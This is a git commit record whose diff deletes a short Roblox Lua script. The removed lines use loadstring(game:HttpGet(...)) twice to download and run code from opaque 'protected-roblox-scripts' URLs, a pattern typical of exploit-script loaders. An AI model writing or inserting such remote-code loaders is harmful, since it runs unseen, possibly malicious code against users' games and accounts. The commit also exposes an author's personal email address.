cc8c01931ee577a1ab2c9decca4fa59feb2104e2
Kyle <krarhader748@gmail.com>
2026-07-01 19:50:41 +0300

    Delete Kyle/Script.lua

--- Kyle/Script.lua
+++
@@ -1,7 +0,0 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/f49d6283e7a2d5d83b9c810d81291a7a"))()
-end)
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/f8ee03da216449019964144c43eff842"))()
-end)
